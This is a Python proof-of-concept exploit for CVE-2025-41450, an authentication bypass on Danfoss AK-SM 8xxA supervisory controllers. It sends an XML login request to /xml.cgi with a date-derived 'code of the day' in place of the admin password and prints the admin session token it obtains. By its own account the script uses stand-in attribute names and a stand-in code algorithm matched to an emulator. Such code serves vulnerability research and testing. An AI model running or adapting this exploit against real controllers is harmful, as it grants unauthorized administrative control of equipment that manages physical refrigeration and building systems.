#!/usr/bin/env python3
"""
PoC: CVE-2025-41450 - Danfoss AK-SM 8xxA "code-of-the-day" authentication bypass.

Sends /xml.cgi?action=getauth with the code-of-the-day request attributes
set and a datetime-derived code in place of the admin password. On a
vulnerable device (< R4.2) this yields a fully authenticated admin session
without knowing any configured credential.

The real bypass attribute names and generation algorithm were redacted in
the public Claroty Team82 writeup; this PoC implements the documented
mechanism and must match the emulator (or real firmware reversing results).

Usage: cve_2025_41450_code_of_the_day.py [--target HOST:PORT] [--date YYYY-MM-DD]
Exit 0 = bypass succeeded, 1 = failed.
"""

import argparse
import hashlib
import sys
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET
from datetime import datetime


def generate_code(day: datetime) -> str:
    """Stand-in algorithm; must mirror emulator/aksm800a_emulator.py."""
    seed = f"AKSM-COTD-{day.year:04d}-{day.month:02d}-{day.day:02d}"
    return f"{int(hashlib.md5(seed.encode()).hexdigest(), 16) % 900000 + 100000}"


def post_xml(base: str, fields: dict, session: str = None):
    body = ("<?xml version=\"1.0\"?><request>" +
            "".join(f"<{k}>{v}</{k}>" for k, v in fields.items()) +
            "</request>").encode()
    url = base + "/xml.cgi?action=getauth"
    req = urllib.request.Request(url, data=body,
                                 headers={"Content-Type": "text/xml"})
    if session:
        req.add_header("Cookie", f"SMSession={session}")
    print(f"--> POST {url}")
    print(f"    {body.decode()}")
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = resp.read()
        cookie = resp.headers.get("Set-Cookie", "")
    print(f"<-- {resp.status} {data.decode(errors='replace').strip()}")
    if cookie:
        print(f"<-- Set-Cookie: {cookie}")
    return data, cookie


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:8080")
    ap.add_argument("--date", default=None,
                    help="device date YYYY-MM-DD (default: today, local time)")
    args = ap.parse_args()
    base = f"http://{args.target}"

    print("[*] step 1: baseline - normal auth with a wrong password")
    data, _ = post_xml(base, {"username": "admin", "password": "wrong-password"})
    if b"authentication failed" not in data:
        print("[!] unexpected: wrong password accepted, something is off")
        return 1

    day = datetime.strptime(args.date, "%Y-%m-%d") if args.date else datetime.now()
    code = generate_code(day)
    print(f"[*] step 2: code-of-the-day bypass for device date {day:%Y-%m-%d}")
    print(f"[*] generated code: {code}")

    data, cookie = post_xml(base, {
        "username": "admin",
        "password": code,
        "codeofday": "1",   # stand-in for redacted bypass attribute #1
        "support": "1",     # stand-in for redacted bypass attribute #2
    })

    if b"<result>ok</result>" in data and "SMSession=" in cookie:
        session = cookie.split("SMSession=")[1].split(";")[0]
        print(f"[+] BYPASS SUCCESSFUL - admin session without configured password")
        print(f"[+] session token: {session}")
        return 0

    print("[-] bypass failed (target patched or algorithm mismatch)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
